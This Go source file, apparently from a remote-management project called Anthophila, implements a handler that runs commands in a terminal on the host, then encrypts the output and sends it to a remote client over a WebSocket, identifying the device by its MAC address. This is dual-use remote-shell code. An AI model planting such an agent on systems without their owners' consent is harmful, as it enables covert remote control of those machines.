package management

import (
	"Anthophila/information"
	"Anthophila/logging"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/gorilla/websocket"
)

// TerminalHandler відповідає за запуск терміналу, прийом виводу з нього,
// шифрування результату та надсилання його через WebSocket клієнту.
type TerminalHandler struct {
	Logger        *logging.LoggerService // Сервіс для логування
	WSocket       *websocket.Conn        // WebSocket-зʼєднання для комунікації з клієнтом
	Term          *TManager              // Менеджер терміналу для виконання команд
	CurrentClient *string                // Ідентифікатор (MAC або імʼя) клієнта, що викликав команду
	Cancel        chan struct{}          // Канал для зупинки горутини listen()
	Encryptor     *CryptoManager         // Шифрувальник для захисту даних
	Sender        *Sender                // Асинхронний відправник повідомлень
}

// NewTerminalHandler створює новий екземпляр TerminalHandler із переданими параметрами.
func NewTerminalHandler(logger *logging.LoggerService, ws *websocket.Conn, encryptor *CryptoManager, client *string, Sender *Sender) *TerminalHandler {
	return &TerminalHandler{
		Logger:        logger,
		WSocket:       ws,
		Encryptor:     encryptor,
		CurrentClient: client,
		Cancel:        make(chan struct{}),
		Sender:        Sender,
	}
}

// Start запускає новий термінал (TManager) та слухає його вихід у окремій горутині.
func (t *TerminalHandler) Start() error {
	t.Term = NewTerminalManager() // Створює новий об'єкт терміналу (обгортка навколо exec.Cmd)
	if err := t.Term.Start(); err != nil {
		// Повертає помилку, якщо запуск терміналу завершився невдачею
		return err
	}
	go t.listen() // Запускає окрему горутину для прослуховування виводу з терміналу
	return nil    // Повертає nil, якщо все успішно
}

// Stop зупиняє термінал та завершує горутину прослуховування виводу.
func (t *TerminalHandler) Stop() {
	if t.Term != nil {
		t.Term.Stop() // Завершує процес терміналу, зупиняє читання та очікує завершення горутин
	}
	close(t.Cancel) // Надсилає сигнал у канал Cancel, що завершує метод listen()
}

// SendCommand передає команду в TManager, якщо термінал активний.
func (t *TerminalHandler) SendCommand(command string) {
	if t.Term != nil {
		t.Term.SendCommand(command) // Передає команду на виконання у TManager (stdin)
	}
}

// listen запускається в горутині: слухає вивід терміналу та надсилає результат клієнту.
// Шифрує відповідь та використовує Sender для безпечної відправки через WebSocket.
func (t *TerminalHandler) listen() { // Запускається як окрема горутина — слухає вивід терміналу (stdout)
	for {
		select {
		case <-t.Cancel:
			// Якщо отримано сигнал на завершення (через t.Cancel) — зупиняємо горутину
			return

		case line := <-t.Term.GetOutput():
			// Отримуємо новий рядок з терміналу (вивід команди)
			// line — це вивід команди, наприклад: "ls -l\n"

			// Друк у консоль: який клієнт надіслав команду
			fmt.Printf("User who send command " + (*t.CurrentClient) + "\n")

			// Створюємо структуру повідомлення, яке буде відправлено назад клієнту
			msg := Message{
				SClient: information.NewInfo().GetMACAddress(),                 // MAC-адреса цього пристрою (використовується як ідентифікатор)
				RClient: *t.CurrentClient,                                      // Кому ми надсилаємо відповідь (клієнт, що надіслав команду)
				Message: "{\"terminal\":\"" + strings.Trim(line, "\n") + "\"}", // JSON-рядок з відповіддю терміналу
				// Наприклад: "{\"terminal\":\"total 0\"}"
			}

			// Серіалізація структури msg у JSON
			jsonData, err := json.Marshal(msg)
			if err != nil {
				// Якщо помилка при маршалінгу — лог і продовжуємо цикл
				t.Logger.Log("Marshal error:", err.Error())
				continue
			}

			// Шифруємо JSON-повідомлення перед відправкою
			encrypted := t.Encryptor.EncryptText(string(jsonData))

			// Асинхронно надсилаємо зашифроване повідомлення через Sender (WebSocket)
			t.Sender.Send([]byte(encrypted))
		}
	}
}
